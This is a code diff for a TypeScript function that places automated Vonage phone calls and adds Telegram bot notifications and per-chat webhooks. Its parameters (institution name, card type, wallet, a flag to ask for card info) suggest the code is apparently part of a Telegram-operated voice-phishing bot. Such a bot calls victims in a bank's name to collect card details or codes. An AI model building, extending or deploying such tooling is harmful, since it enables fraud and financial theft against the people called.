@@ -2,6 +2,7 @@
 /* eslint-disable no-console */
 import path from 'path';
 import Vonage from '@vonage/server-sdk';
+import { bot } from '..';
 
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
 const vonage = new Vonage({
@@ -138,6 +139,7 @@ export const vonageMakeACall: any = ({
   wallet,
   cardType,
   askCardInfo,
+  chatId,
 }: CallInputType) => {
   const ncco =
     /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
@@ -145,9 +147,11 @@ export const vonageMakeACall: any = ({
     )
       ? nccoPrep(institutionName, 'en-GB', step, wallet, cardType, askCardInfo)
       : nccoPrep(institutionName, 'en-US', step, wallet, cardType, askCardInfo);
+
   // @ts-expect-error create actually exist on vonage object
   return vonage.calls.create(
     {
+      event_url: [`${process.env.ENDPOINT_URL}/vonage-webhook/${chatId}`],
       to: [
         {
           type: 'phone',
@@ -161,9 +165,19 @@ export const vonageMakeACall: any = ({
       ncco,
     },
     // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    (error: any, response: any) => {
-      if (error) console.error('error: ', error);
-      if (response) console.log('response: ', response);
+    async (error: any, response: any) => {
+      if (error) {
+        await bot.telegram.sendMessage(
+          chatId,
+          `Something went wrong try again later.`,
+        );
+        await bot.context.scene?.enter('super-wizard');
+      }
+      if (response) {
+        if (response.status === 'started') {
+          await bot.telegram.sendMessage(chatId, `Calling (${to}) 📞`);
+        }
+      }
     },
   );
 };
